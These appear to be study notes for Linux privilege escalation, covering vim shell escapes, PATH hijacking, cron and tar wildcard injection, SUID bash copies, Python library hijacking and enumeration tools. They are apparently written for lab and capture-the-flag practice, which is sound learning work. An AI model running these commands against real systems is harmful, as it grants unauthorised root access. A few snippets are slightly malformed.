# Manual PrivEsc

1. check passwd and shadow file permissions and try to crate new user with admin privilage using `openssl` or `mkpasswd` in hash.txt file or cracking password

2. exploit `vi` or `vim` editor using :!sh

3. Exploiting Crontab

4. Exploiting PATH Variable
   
   there are an executable file for example test file and when you run this executable file it run a spesific command like "thm" and this execute file "test" you can run it with root privilege "SUID" then find directory that you can read and write on it like /tmp and create file "thm" and `echo /bin/bash >/tmp/thm` and  `chmod 777 thm` and `export PATH=/tmp:$PATH` and run `test` file then you should have root privilage

5. command to search the file system for `SUID/GUID` files
   
   ```bash
   find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
   ```
   
   exim version and search in exploit db

6. Visit [GTFOBins](https://gtfobins.github.io) and search for some of the program names
   
   If the program is listed with `sudo -l` as a function, you can use it to elevate privileges, usually via an escape sequence.

7. crontab
   
   - Check crontab file if there are any thing run and check file permissions
     
     ```bash
     cat /etc/crontab
     ```
   
   - Cron Jobs - PATH Environment Variable
   
   - ```bash
     cp /bin/bash /tmp/rootbash chmod +xs /tmp/rootbash
     ```
   
   - Cron Jobs - Wildcards (*) 
     like this line in `backup.sh` `tar cf /home/milesdyson/backups/backup.tgz *`
     tar or backups
     
     ```bash
     printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
     echo "" > "--checkpoint-action=exec=sh shell.sh"
     echo "" > --checkpoint=1
     /bin/bash -p
     ```
     
     or visit this website
     
      https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
     
     or this video 
     
     https://youtu.be/HXikLrFVIXc?t=2239

8. Passwords & Keys - History Files

9. Passwords & Keys - Config Files

10. Passwords & Keys - SSH Keys

11. NFS

12. Capabilities
    
    ```bash
    getcap -r / 2>/dev/null
    ```

### PrivEsc wiht Python Library Hijacking

If you have python file, and you can run it as root but the file is read-only

    cat backup.py

```py
import random
import os
import requests

''' 
    any python code
''''
```

Then you can create a file with the name of any library imported in the file and create a python file with its libraray name ex:

    vim random.py

```py
import os
os.system("/usr/bin/bash")
```

Then run the `backup.py` file and it will import your library and run the code inside it

    sudo -u userPerm /usr/bin/python3.7 /home/userProgile/backup.py

### PrivEsc wiht MySQL

1. Use ps aux and show if MySQL service run as root

2. using User-Defined Function the steps in the scripts
   
   https://www.exploit-db.com/exploits/1518
   
   https://tryhackme.com/room/linuxprivesc#

### Using env variable hint (not PATH)

https://tryhackme.com/room/linuxprivesc#

### Automation Tools

1. [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

2. [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

3. [linpeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)

4. [linPEAS Win](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

5. [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)   Assessing kernel exposure on publicly known exploits
